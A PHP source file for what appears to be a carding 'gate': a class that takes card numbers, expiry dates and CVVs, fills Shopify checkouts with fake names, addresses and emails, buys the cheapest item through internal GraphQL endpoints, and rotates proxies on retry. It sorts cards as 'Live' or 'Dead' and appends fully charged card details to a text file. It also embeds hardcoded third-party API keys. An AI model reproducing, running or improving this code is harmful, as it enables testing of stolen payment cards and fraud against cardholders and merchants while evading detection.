<?php

class ShopifyAPi
{
   protected $cookie;
   protected $global_tries = 0;
   protected $global_max_tries = 3;

   protected $cc;
   protected $mes;
   protected $ano;
   protected $cvv;

   protected ?array $external_address = null;
   protected ?array $external_product = null;
   protected ?string $external_email = null;
   protected string $currency = 'USD';
   protected string $force_currency = '';
   protected array $bad_products = [];
   protected string $currentVariantId = '';

   private string $logFile;
   private string $card4;

   public function __construct(
      protected string $site,
      protected $server = null,
      protected FakeGenerator|null $fake_data = null,
      protected ?ProxyManager $proxyManager = null
   ) {
      $this->site = $site;
      $this->server = $server;
      $this->cookie = uniqid();
      $this->fake_data = $fake_data;
      $this->logFile = __DIR__ . '/../gate_log.txt';
   }

   public function setCardDetails($cc, $mes, $ano, $cvv)
   {
      $this->cc = $cc;
      $this->mes = ltrim($mes, '0');
      $this->ano = strlen($ano) <= 2 ? "20$ano" : $ano;
      $this->cvv = $cvv;
      $this->card4 = substr($cc, 0, 4) . '****' . substr($cc, -3);
   }

   public function setExternalAddress(?array $address): void
   {
      $this->external_address = $address;
   }

   public function setExternalProduct(?array $product): void
   {
      $this->external_product = $product;
   }

   public function setExternalEmail(?string $email): void
   {
      $this->external_email = $email;
   }

   public static function getString($string, $start, $end)
   {
      try {
         $string = explode($start, $string);
         $string = explode($end, $string[1]);
         if (empty($string[0])) return '';
         return $string[0];
      } catch (Exception $e) {
         return '';
      }
   }

   public static function parseHeaders(string $headers): array
   {
      return array_reduce(
         explode("\r\n", $headers),
         function (array $header, string $line) {
            if (strpos($line, ':') !== false) {
               list($key, $value) = explode(':', $line, 2);
               $header[trim($key)] = trim($value);
            }
            return $header;
         },
         []
      );
   }

   private static array $productBlacklistKeywords = [
      'return',
      'protection',
      'exchange',
      'warranty',
      'extended warranty',
      'insurance',
      'plan',
      'membership',
      'subscription',
      'gift card',
      'store credit',
      'credit',
      'add-on',
      'addon',
      'fee',
      'service',
      'unlimited return',
      'free unlimited',
   ];

   public static function getMinimumPriceProductDetails(string $json, array $excludedVariantIds = []): array
   {
      $data = json_decode($json, true);
      if (!is_array($data) || !isset($data['products'])) {
         throw new Exception('Invalid JSON format or missing products key');
      }

      $minPrice = null;
      $minPriceDetails = ['id' => null, 'price' => null, 'title' => null];

      foreach ($data['products'] as $product) {
         $title = strtolower($product['title'] ?? '');
         $isBlacklisted = false;
         foreach (self::$productBlacklistKeywords as $kw) {
            if (str_contains($title, $kw)) {
               $isBlacklisted = true;
               break;
            }
         }
         if ($isBlacklisted) continue;

         foreach ($product['variants'] as $variant) {
            if (in_array($variant['id'], $excludedVariantIds)) continue;
            $price = (float) $variant['price'];
            if ($price >= 1.00) {
               if ($minPrice === null || $price < $minPrice) {
                  $minPrice = $price;
                  $minPriceDetails = [
                     'id' => $variant['id'],
                     'price' => $variant['price'],
                     'title' => $product['title'],
                  ];
               }
            }
         }
      }

      if ($minPrice === null) {
         throw new Exception('No products found with price greater than or equal to 1.00');
      }
      return $minPriceDetails;
   }

   public static function extractOperationIds(string $html, $CurlX, $server = null): array
   {
      $result = ['proposal' => '', 'submitForCompletion' => '', 'pollForReceipt' => ''];

      try {
         $importmapJson = self::getString($html, '<script type="systemjs-importmap">', '</script>');

         $actionsPath = '';
         if (!empty($importmapJson)) {
            $importmap = json_decode($importmapJson, true);
            $imports = $importmap['imports'] ?? [];
            foreach ($imports as $path => $url) {
               if (preg_match('#/actions\.#', $path)) {
                  $actionsPath = $path;
                  break;
               }
            }
            if (empty($actionsPath)) {
               foreach ($imports as $path => $url) {
                  if (preg_match('#/actions-legacy\.#', $path)) {
                     $actionsPath = $path;
                     break;
                  }
               }
            }
         }
         if (empty($actionsPath)) {
            if (preg_match('#(/cdn/shopifycloud/checkout-web/assets/c1/actions(?:-legacy)?\.[^\."]+\.js)#', $html, $m)) {
               $actionsPath = $m[1];
            }
         }
         if (!empty($actionsPath)) {
            $jsContent = $CurlX->get('https://cdn.shopify.com' . $actionsPath, [], null, $server)->getBody();
            if (!empty($jsContent)) {
               if (preg_match('/id:\s*"([a-f0-9]{64})",\s*type:\s*"query",\s*name:\s*"Proposal"/i', $jsContent, $m)) {
                  $result['proposal'] = $m[1];
               }
               if (preg_match('/id:\s*"([a-f0-9]{64})",\s*type:\s*"mutation",\s*name:\s*"SubmitForCompletion"/i', $jsContent, $m)) {
                  $result['submitForCompletion'] = $m[1];
               }
            }
         }

         $hydratePath = '';
         if (!empty($importmapJson)) {
            $importmap = json_decode($importmapJson, true);
            $imports = $importmap['imports'] ?? [];
            foreach ($imports as $path => $url) {
               if (preg_match('#/hydrate\.#', $path)) {
                  $hydratePath = $path;
                  break;
               }
            }
            if (empty($hydratePath)) {
               foreach ($imports as $path => $url) {
                  if (preg_match('#/hydrate-legacy\.#', $path)) {
                     $hydratePath = $path;
                     break;
                  }
               }
            }
         }
         if (empty($hydratePath)) {
            if (preg_match('#(/cdn/shopifycloud/checkout-web/assets/c1/hydrate(?:-legacy)?\.[^\."]+\.js)#', $html, $m)) {
               $hydratePath = $m[1];
            }
         }
         if (!empty($hydratePath)) {
            $hydrateContent = $CurlX->get('https://cdn.shopify.com' . $hydratePath, [], null, $server)->getBody();
            if (!empty($hydrateContent)) {
               if (preg_match('/id:\s*"([a-f0-9]{64})",\s*type:\s*"query",\s*name:\s*"PollForReceipt"/i', $hydrateContent, $m)) {
                  $result['pollForReceipt'] = $m[1];
               }
            }
         }

         return $result;
      } catch (\Throwable $e) {
         return $result;
      }
   }

   // ─── Logging ────────────────────────────────────────────

   private function log(string $step): void
   {
      if (defined('SHOPIFY_DEBUG') && SHOPIFY_DEBUG === false) return;
      $ts = date('H:i:s.') . substr(sprintf('%.3f', fmod(microtime(true) * 1000, 1000)), 0, 3);
      $pid = getmypid();
      file_put_contents($this->logFile, "[$ts] [PID:$pid] [$this->card4] $step\n", FILE_APPEND | LOCK_EX);
   }

   // ─── Step: Geocode ──────────────────────────────────────

   private function geocode(CurlX $CurlX, string $num, string $street, string $city): array
   {
      $geoCacheFile = __DIR__ . '/../cache_geo.json';
      $geoCache = file_exists($geoCacheFile) ? (json_decode(file_get_contents($geoCacheFile), true) ?: []) : [];
      $geoKey = md5("$num, $street, $city");

      if (isset($geoCache[$geoKey])) {
         $this->log("GEOCODING OK (cached) - lat:{$geoCache[$geoKey]['lat']} lon:{$geoCache[$geoKey]['lon']}");
         return $geoCache[$geoKey];
      }

      $keys = ['pk.096811ec6ed0fe60bb3f41c409bb332d', 'pk.2790b6fb623e84e3f8252389ff06079c'];
      $key = $keys[array_rand($keys)];

      $response = $CurlX->get('https://us1.locationiq.com/v1/search?key=' . $key . '&q=' . urlencode("$num, $street, $city") . '&format=json', [], null, $this->server);
      $geocoding_data = json_decode($response->getBody(), true);

      $lat = (float) (@$geocoding_data[0]['lat'] ?? 40.747855);
      $lon = (float) (@$geocoding_data[0]['lon'] ?? -73.94499);

      if (empty($lat) || empty($lon)) {
         throw new Exception('LocationIQ API returned invalid coordinates.');
      }

      $geoCache[$geoKey] = ['lat' => $lat, 'lon' => $lon];
      file_put_contents($geoCacheFile, json_encode($geoCache), LOCK_EX);
      $this->log("GEOCODING OK - lat:$lat lon:$lon");

      return ['lat' => $lat, 'lon' => $lon];
   }

   // ─── Step: Product ──────────────────────────────────────

   private function findProduct(CurlX $CurlX): array
   {
      if ($this->external_product) {
         return [
            'id' => $this->external_product['variant']['id'],
            'price' => $this->external_product['variant']['price'],
            'title' => $this->external_product['title'] ?? '',
         ];
      }

      $response = $CurlX->get("$this->site/products.json", [], null, $this->server);
      $details = self::getMinimumPriceProductDetails($response->getBody(), $this->bad_products);
      if (!defined('SHOPIFY_DEBUG') || SHOPIFY_DEBUG) file_put_contents('responses/products.json', json_encode($details, JSON_PRETTY_PRINT), FILE_APPEND | LOCK_EX);

      return $details;
   }

   // ─── Step: CC Token ─────────────────────────────────────

   private function getCcToken(CurlX $CurlX, string $firstName, string $lastName, string $domain): string
   {
      $response = $CurlX->post(
         'https://deposit.shopifycs.com/sessions',
         json_encode([
            'credit_card' => [
               'number' => $this->cc,
               'month' => $this->mes,
               'year' => $this->ano,
               'verification_value' => $this->cvv,
               'start_month' => null,
               'start_year' => null,
               'issue_number' => '',
               'name' => "$firstName $lastName",
            ],
            'payment_session_scope' => $domain,
         ]),
         ['Content-Type: application/json'],
         $this->cookie,
         $this->server
      );

      $data = json_decode($response->getBody(), true);
      $token = $data['id'] ?? '';

      if (empty($token)) {
         throw new Exception('Error getting cc token');
      }

      $this->log("CC TOKEN OK - " . substr($token, 0, 20) . "...");
      return $token;
   }

   // ─── Step: Proposal ─────────────────────────────────────

   private function sendProposal(
      CurlX $CurlX,
      CheckoutDataExtractor $extractor,
      array $headers,
      string $site,
      array $proposalPayload
   ): array {
      $payload = json_encode($proposalPayload);
      $retries = 0;

      proposalRetry:
      $response = $CurlX->post("$site/checkouts/internal/graphql/persisted?operationName=Proposal", $payload, $headers, $this->cookie, $this->server);
      if (!defined('SHOPIFY_DEBUG') || SHOPIFY_DEBUG) file_put_contents('responses/2.json', "\n" . $payload . "\n" . $response->getBody(), FILE_APPEND | LOCK_EX);
      $this->log("PROPOSAL OK - http:" . $response->getStatusCode() . " body:" . strlen($response->getBody()) . "bytes");

      $decoded = json_decode($response->getBody());

      // Handle proposal errors
      $proposalErrors = $decoded->data->session->negotiate->errors ?? [];
      if (!empty($proposalErrors)) {
         $hasOutOfStock = false;
         $hasCurrencyMismatch = false;
         $hasRequiredArtifacts = false;
         $shouldRetry = false;

         foreach ($proposalErrors as $pErr) {
            $errCode = $pErr->code ?? '';
            $this->log("PROPOSAL ERROR: $errCode - " . ($pErr->nonLocalizedMessage ?? ''));

            if (in_array($errCode, ['DELIVERY_NO_DELIVERY_STRATEGY_AVAILABLE_FOR_MERCHANDISE_LINE', 'PAYMENTS_PROPOSED_GATEWAY_UNAVAILABLE', 'PAYMENTS_METHOD'])) {
               throw new Exception("Proposal error: $errCode (not retryable)");
            }
            if ($errCode === 'MERCHANDISE_OUT_OF_STOCK') $hasOutOfStock = true;
            if ($errCode === 'BUYER_IDENTITY_PRESENTMENT_CURRENCY_DOES_NOT_MATCH') $hasCurrencyMismatch = true;
            if ($errCode === 'REQUIRED_ARTIFACTS_UNAVAILABLE') $hasRequiredArtifacts = true;
            if ($errCode === 'VALIDATION_CUSTOM') {
               $this->log("PROPOSAL VALIDATION_CUSTOM - item cannot be purchased alone, retrying with different product");
               $this->bad_products[] = $this->external_product['variant']['id'] ?? $this->currentVariantId;
               throw new Exception("Proposal error: VALIDATION_CUSTOM (retryable)");
            }
            if ($errCode === 'WAITING_PENDING_TERMS') {
               $shouldRetry = true;
            }
            if ($errCode === 'DELIVERY_DELIVERY_LINE_DETAIL_CHANGED') {
               $this->log("PROPOSAL DELIVERY CHANGED - delivery details changed (non-blocking)");
            }
         }

         if ($hasCurrencyMismatch) {
            $correctCurrency = 'USD';
            if (preg_match('/"presentmentCurrency":"([A-Z]{3})"/', $response->getBody(), $m)) {
               $correctCurrency = $m[1];
            }
            $this->force_currency = $correctCurrency;
            throw new Exception("Proposal error: BUYER_IDENTITY_PRESENTMENT_CURRENCY_DOES_NOT_MATCH to $correctCurrency (retryable)");
         }

         if ($hasOutOfStock) {
            $this->bad_products[] = $this->external_product['variant']['id'] ?? $this->currentVariantId;
            if (count($this->bad_products) >= 2) throw new Exception("MERCHANDISE_OUT_OF_STOCK (fatal)");
            throw new Exception("Proposal error: MERCHANDISE_OUT_OF_STOCK (retryable)");
         }

         if ($shouldRetry) {
            if ($retries < 3) {
               $retries++;
               $this->log("PROPOSAL PENDING/CHANGED - retrying ($retries/3)");
               sleep(2);
               goto proposalRetry;
            }
            throw new Exception("Proposal error: WAITING_PENDING_TERMS (max retries reached)");
         }

         if ($hasRequiredArtifacts) {
            throw new Exception("Proposal error: REQUIRED_ARTIFACTS_UNAVAILABLE (not retryable)");
         }
      }

      $sellerProposal = $decoded->data->session->negotiate->result->sellerProposal ?? null;
      if (!$sellerProposal) {
         $this->log("PROPOSAL ERROR - sellerProposal not found. body snippet: " . substr($response->getBody(), 0, 500));
         throw new Exception('SellerProposal not found.');
      }

      return json_decode(json_encode($sellerProposal), true);
   }

   // ─── Step: Submit ───────────────────────────────────────

   private function sendSubmit(
      CurlX $CurlX,
      string $site,
      array $headers,
      string $payload,
      string $firstName,
      string $lastName,
      string $domain
   ): string {
      $ccRetryDone = false;
      $ccToken = json_decode($payload, true)['variables']['input']['payment']['paymentLines'][0]['paymentMethod']['directPaymentMethod']['sessionId'] ?? '';

      submitRetry:
      $response = $CurlX->post("$site/checkouts/internal/graphql/persisted?operationName=SubmitForCompletion", $payload, $headers, $this->cookie, $this->server);
      $data = json_decode($response->getBody());

      if (!defined('SHOPIFY_DEBUG') || SHOPIFY_DEBUG) file_put_contents('responses/3.json', "\n" . $payload . "\n" . $response->getBody(), FILE_APPEND | LOCK_EX);
      $this->log("SUBMIT OK - http:" . $response->getStatusCode() . " body:" . strlen($response->getBody()) . "bytes");

      $receiptId = $data->data->submitForCompletion->receipt->id ?? '';

      if (!empty($data->errors)) {
         $this->log("SUBMIT ERRORS: " . json_encode($data->errors));
         throw new Exception("Submit error: Gate not supported");
      }

      if (empty($receiptId) && !$ccRetryDone) {
         $submitErrors = $data->data->submitForCompletion->errors ?? [];
         $hasOutOfStock = false;
         $hasCurrencyMismatch = false;

         foreach ($submitErrors as $err) {
            $errCode = $err->code ?? '';
            if ($errCode === 'MERCHANDISE_OUT_OF_STOCK') $hasOutOfStock = true;
            if ($errCode === 'BUYER_IDENTITY_PRESENTMENT_CURRENCY_DOES_NOT_MATCH') $hasCurrencyMismatch = true;
            if ($errCode === 'TAX_NEW_TAX_MUST_BE_ACCEPTED') {
               $this->log("SUBMIT TAX_CHANGED - tax allocations changed, retrying from proposal");
               throw new Exception("Submit error: TAX_NEW_TAX_MUST_BE_ACCEPTED (retryable)");
            }
            if ($errCode === 'VALIDATION_CUSTOM') {
               $this->log("SUBMIT VALIDATION_CUSTOM - item cannot be purchased alone");
               $this->bad_products[] = $this->external_product['variant']['id'] ?? $this->currentVariantId;
               throw new Exception("Submit error: VALIDATION_CUSTOM (retryable)");
            }

            if ($errCode === 'PAYMENTS_CREDIT_CARD_SESSION_ID') {
               $this->log("SUBMIT SESSION EXPIRED - retrying with new CC token");
               $ccRetryDone = true;

               $newToken = $this->getCcToken($CurlX, $firstName, $lastName, $domain);
               if (!empty($newToken)) {
                  $payload = str_replace('"sessionId":"' . $ccToken . '"', '"sessionId":"' . $newToken . '"', $payload);
                  $payload = str_replace('"sessionId": "' . $ccToken . '"', '"sessionId": "' . $newToken . '"', $payload);
                  $this->log("SUBMIT SESSION RETRY - new token: " . substr($newToken, 0, 20) . "...");
                  goto submitRetry;
               }
            }
         }

         if ($hasOutOfStock) {
            $this->bad_products[] = $this->external_product['variant']['id'] ?? $this->currentVariantId;
            if (count($this->bad_products) >= 2) throw new Exception("MERCHANDISE_OUT_OF_STOCK (fatal)");
            throw new Exception("Submit error: MERCHANDISE_OUT_OF_STOCK (retryable)");
         }
         if ($hasCurrencyMismatch) {
            $correctCurrency = 'USD';
            if (preg_match('/"presentmentCurrency":"([A-Z]{3})"/', $response->getBody(), $m)) {
               $correctCurrency = $m[1];
            }
            $this->force_currency = $correctCurrency;
            throw new Exception("Submit error: BUYER_IDENTITY_PRESENTMENT_CURRENCY_DOES_NOT_MATCH to $correctCurrency (retryable)");
         }
      }

      if (empty($receiptId)) {
         // Intentar clasificar desde errores del Submit
         $submitErrors = $data->data->submitForCompletion->errors ?? [];
         if (!empty($submitErrors)) {
            $codes = [];
            foreach ($submitErrors as $e) {
               $codes[] = $e->code ?? '';
            }
            $firstCode = $codes[0] ?? '';
            $cardErrors = ['GENERIC_ERROR', 'INSUFFICIENT_FUNDS', 'INCORRECT_CVC', 'INCORRECT_CVV', 'INVALID_CVC', 'CARD_DECLINED', 'DO_NOT_HONOR', 'STOLEN_CARD', 'EXPIRED_CARD'];
            if (in_array($firstCode, $cardErrors)) {
               throw new Exception("Card error: $firstCode");
            }
            $this->log("SUBMIT REJECTED - codes: " . implode(', ', $codes));
            throw new Exception("Submit rejected: $firstCode");
         }
         $this->log("SUBMIT NO RECEIPT - body snippet: " . substr($response->getBody(), 0, 500));
         throw new Exception('Receipt ID not found.');
      }

      return $receiptId;
   }

   // ─── Step: Poll ─────────────────────────────────────────

   private function pollReceipt(CurlX $CurlX, string $site, array $headers, string $receiptId, string $sessionToken, string $pollQueryId): object
   {
      $this->log("POLL START - receipt:$receiptId");

      $pollVariables = json_encode(['receiptId' => $receiptId, 'sessionToken' => $sessionToken]);
      $pollQuery = http_build_query(['operationName' => 'PollForReceipt', 'variables' => $pollVariables, 'id' => $pollQueryId]);
      $pollUrl = "$site/checkouts/internal/graphql/persisted?$pollQuery";

      $retries = 0;
      do {
         sleep(2);
         $retries++;
         if ($retries > 3) throw new Exception('Max retries reached');

         $response = $CurlX->get($pollUrl, $headers, $this->cookie, $this->server);
         $this->log("POLL #$retries - http:" . $response->getStatusCode() . " body:" . strlen($response->getBody()) . "bytes");
         if (!defined('SHOPIFY_DEBUG') || SHOPIFY_DEBUG) file_put_contents('responses/poll.json', $response->getBody(), FILE_APPEND | LOCK_EX);
      } while (
         strpos($response->getBody(), '"__typename":"ProcessingReceipt"') !== false ||
         strpos($response->getBody(), '"__typename":"WaitingReceipt"') !== false
      );

      return json_decode($response->getBody());
   }

   // ─── Step: Classify result ──────────────────────────────

   private function classifyResult(string $body, object $data_response, string $minPrice): string
   {
      if (
         strpos($body, '/thank_you') !== false ||
         strpos($body, '/post_purchase') !== false ||
         strpos($body, 'Your order is confirmed') !== false ||
         strpos($body, 'Thank you') !== false ||
         strpos($body, 'ThankYou') !== false ||
         strpos($body, 'thank_you') !== false ||
         strpos($body, 'success') !== false ||
         strpos($body, 'classicThankYouPageUrl') !== false ||
         strpos($body, '"__typename":"ProcessedReceipt"') !== false ||
         strpos($body, 'SUCCESS') !== false
      ) {
         $card = $this->cc . "|" . $this->mes . "|" . $this->ano . "|" . $this->cvv;
         file_put_contents('sexx.txt', $card . " - " . $body, FILE_APPEND);
         return "Live:  Charged successfully [$minPrice] - [$this->global_tries/$this->global_max_tries]";
      }

      if (strpos($body, 'INSUFFICIENT_FUNDS') !== false) return "Live:  INSUFFICIENT_FUNDS [$this->global_tries/$this->global_max_tries]";
      if (strpos($body, 'INCORRECT_CVC') !== false || strpos($body, 'INCORRECT_CVV') !== false || strpos($body, 'INVALID_CVC') !== false) return "Live:  INCORRECT_CVC [$this->global_tries/$this->global_max_tries]";
      if (strpos($body, '/stripe/authentications/') !== false) return "Dead:  3D [$this->global_tries/$this->global_max_tries]";
      if (strpos($body, 'CompletePaymentChallenge') !== false) return "Dead:  3D[$this->global_tries/$this->global_max_tries]";
      if (isset($data_response->data->receipt->processingError->code)) return "Dead: " . $data_response->data->receipt->processingError->code . " - [$this->global_tries/$this->global_max_tries]";

      $this->log("RESULT: Response Not Found");
      return "Error: Response Not Found - [$this->global_tries/$this->global_max_tries]";
   }

   // ─── Main flow ──────────────────────────────────────────

   public function checkout()
   {
      $CurlX = new CurlX();
      $fake_helper = $this->fake_data ?? new FakeGenerator();

      $this->log("CHECKOUT() ENTRY - site: {$this->site}");

      // Detect country from TLD
      $domain = parse_url($this->site, PHP_URL_HOST) ?? '';
      $tld = strtolower(substr($domain, strrpos($domain, '.') + 1));
      $countryCode = match ($tld) {
         'ca' => 'CA',
         'co.uk', 'uk' => 'UK',
         'com.au' => 'AU',
         default => 'US',
      };

      // Resolve address
      if ($this->external_address) {
         $address = $this->external_address['street'] ?? '';
         $city_us = $this->external_address['city'] ?? '';
         $state_us = $this->external_address['state'] ?? '';
         $zip_us = $this->external_address['zip'] ?? '';
         $countryCode = 'US';
         $phone = $this->external_address['phone'] ?? $fake_helper->generatePhoneNumber('US');
         $parts = explode(' ', $address, 2);
         $num_us = $parts[0] ?? '';
         $address_us = $parts[1] ?? '';
      } else {
         $randomAddress = $fake_helper->getRandomAddressByCountry($countryCode);
         $num_us = $randomAddress['num'];
         $address_us = $randomAddress['address1'];
         $address = $num_us . ' ' . $address_us;
         $city_us = $randomAddress['city'];
         $state_us = $randomAddress['state'];
         $zip_us = $randomAddress['zip'];
         $phone = $fake_helper->generatePhoneNumber($countryCode);
      }

      $FirstName = $fake_helper->FirstName();
      $LastName = $fake_helper->LastName();
      $Email = $this->external_email ?? $fake_helper->Email();
      $ua = $fake_helper->userAgent();

      $this->log("COUNTRY: $countryCode | ADDR: $address, $city_us, $state_us, $zip_us");

      $site = $this->site;

      do {
         try {
            // 1. Geocode
            $this->log("GEOCODING...");
            $geo = $this->geocode($CurlX, $num_us, $address_us, $city_us);
            $lat = $geo['lat'];
            $lon = $geo['lon'];

            // 2. Validate site
            $domain = parse_url($site, PHP_URL_HOST);
            if (!filter_var($site, FILTER_VALIDATE_URL)) throw new Exception('Invalid site URL.');
            $site = parse_url($site, PHP_URL_SCHEME) . "://" . $domain;

            // 3. Find product
            $product = $this->findProduct($CurlX);
            $minPriceProductId = $product['id'];
            $this->currentVariantId = $minPriceProductId;
            $minPrice = $product['price'];
            $productTitle = $product['title'];
            $this->log("PRODUCT OK - id:$minPriceProductId price:$minPrice title:$productTitle");

            // 4. Add to cart
            $response = $CurlX->get("$site/cart/$minPriceProductId:1", [], $this->cookie, $this->server);
            $this->log("CART ADD OK - http:" . $response->getStatusCode() . " body:" . strlen($response->getBody()) . "bytes");
            $checkoutHtml = $response->getBody();

            // 5. Extract data
            $this->log("EXTRACTING - HTML:" . strlen($checkoutHtml) . "bytes");
            $extractor = new CheckoutDataExtractor($checkoutHtml);
            $this->log("EXTRACTOR OK");
            $sessionToken = CheckoutDataExtractor::meta($checkoutHtml, 'serialized-sessionToken');
            $checkoutToken = CheckoutDataExtractor::meta($checkoutHtml, 'serialized-sourceToken');
            $queueToken = $extractor->getQueueToken();
            $currency = $extractor->getCurrency();
            $paymentMethodIdentifier = $extractor->getPaymentMethodIdentifier();
            $this->log("META OK - session:" . strlen($sessionToken) . " checkout:" . strlen($checkoutToken) . " queue:" . strlen($queueToken));

            if (!empty($this->force_currency)) $currency = $this->force_currency;
            $this->currency = $currency;
            $extractor->setCurrency($currency);

            $this->log("EXTRACTING OPS...");
            $operationIds = self::extractOperationIds($checkoutHtml, $CurlX, $this->server);
            $proposalQueryId = $operationIds['proposal'];
            $submitQueryId = $operationIds['submitForCompletion'];
            $pollQueryId = $operationIds['pollForReceipt'];
            $this->log("OPS OK - proposal:" . strlen($proposalQueryId) . " submit:" . strlen($submitQueryId));

            if (empty($sessionToken) || empty($queueToken) || empty($checkoutToken) || empty($paymentMethodIdentifier)) {
               throw new Exception('Error getting tokens');
            }

            $webBuildId = self::getString($checkoutHtml, 'Sha&quot;:&quot;', '&quot;,&quot;');
            if (empty($webBuildId)) throw new Exception('Error getting web build ID');

            $this->log("TOKENS OK - currency:$currency build:$webBuildId queue:$queueToken");
            $this->log("CHECKOUT TOKEN OK - $checkoutToken");

            // 7. Build address
            $addressData = [
               'address' => $address,
               'city' => $city_us,
               'state' => $state_us,
               'zip' => $zip_us,
               'countryCode' => $countryCode,
               'phone' => $phone,
               'firstName' => $FirstName,
               'lastName' => $LastName,
               'lat' => $lat,
               'lon' => $lon,
            ];

            $headers = [
               'content-type: application/json',
               'origin: ' . $site,
               'x-checkout-one-session-token: ' . $sessionToken,
               'x-checkout-web-build-id: ' . $webBuildId,
               'x-checkout-web-deploy-stage: production',
               'x-checkout-web-server-handling: fast',
               'x-checkout-web-server-rendering: no',
               'x-checkout-web-source-id: ' . $checkoutToken,
               'User-Agent: ' . $ua
            ];

            // 8. Proposal
            $proposalPayload = $extractor->buildProposalPayload($sessionToken, $queueToken, $addressData, $Email, $proposalQueryId);
            $sellerProposal = $this->sendProposal($CurlX, $extractor, $headers, $site, $proposalPayload);
            $extractor->updateFromProposalResponse($sellerProposal);

            // 9. Extract submit data
            $handle = $extractor->getDeliveryHandle();
            $delamount = $extractor->getDeliveryAmount();
            $tax = $extractor->getTaxAmount();
            $currencyCode = $extractor->getTaxCurrency();
            $totalAmount = $extractor->getTotalAmount();
            $isShippingRequired = $extractor->isShippingRequired();
            $stableId = $extractor->getStableIds()[0] ?? '';

            if (empty($handle)) {
               $this->log("PROPOSAL DELIVERY - handle is empty");
               throw new Exception('Delivery handle not found.');
            }

            $this->log("PROPOSAL OK - shipping:" . ($isShippingRequired ? 'yes' : 'no') . " handle:" . ($handle ?: 'none') . " ship:$delamount tax:$tax total:$totalAmount");

            // 10. CC Token (justo antes de Submit para evitar expiración)
            $ccToken = $this->getCcToken($CurlX, $FirstName, $LastName, $domain);

            // 11. Submit
            $submitPayload = $extractor->buildSubmitPayload(
               $sessionToken,
               $queueToken,
               $handle,
               $delamount,
               $tax,
               $totalAmount,
               $currencyCode,
               $ccToken,
               $paymentMethodIdentifier,
               $checkoutToken,
               $stableId,
               $submitQueryId,
               $site,
               substr($this->cc, 0, 6),
               $addressData,
               $Email
            );

            $receiptId = $this->sendSubmit($CurlX, $site, $headers, json_encode($submitPayload), $FirstName, $LastName, $domain);

            // 11. Poll
            $pollResponse = $this->pollReceipt($CurlX, $site, $headers, $receiptId, $sessionToken, $pollQueryId);

            $CurlX->deleteCookie();

            // 12. Classify result
            $body = json_encode($pollResponse);
            return $this->classifyResult($body, $pollResponse, $minPrice);
         } catch (Exception $e) {
            try {
               $CurlX->deleteCookie();
            } catch (\Throwable $ignored) {
            }
            $this->log("EXCEPTION: " . $e->getMessage() . " (try $this->global_tries/$this->global_max_tries)");

            if (str_contains($e->getMessage(), 'MERCHANDISE_OUT_OF_STOCK (fatal)')) return "Dead: no hay stock de ese producto - [$this->global_tries/$this->global_max_tries]";
            if (str_contains($e->getMessage(), 'not retryable') || str_contains($e->getMessage(), 'Receipt ID not found')) return "Error: " . $e->getMessage();
            if (str_contains($e->getMessage(), 'No products found')) return "Dead: no hay stock de ese producto - [$this->global_tries/$this->global_max_tries]";
            if (str_contains($e->getMessage(), 'Card error:')) {
               $code = trim(str_replace('Card error:', '', $e->getMessage()));
               return "Dead: $code - [$this->global_tries/$this->global_max_tries]";
            }
            if (str_contains($e->getMessage(), 'Submit rejected:')) {
               return "Error: " . $e->getMessage();
            }

            $this->global_tries++;
            if ($this->global_tries >= $this->global_max_tries) {
               if (str_contains($e->getMessage(), 'MERCHANDISE_OUT_OF_STOCK')) return "Dead: no hay stock de ese producto - [$this->global_tries/$this->global_max_tries]";
               return "Error: " . $e->getMessage() . " - Max retries reached.";
            }

            if ($this->proxyManager) {
               $this->server = $this->proxyManager->random();
               $this->cookie = uniqid();
               $this->log("RETRY #{$this->global_tries} - NEW PROXY: {$this->server['server']}");
            } else {
               $this->log("RETRY #{$this->global_tries} - same proxy (no ProxyManager)");
            }
         }
      } while (true);
   }
}
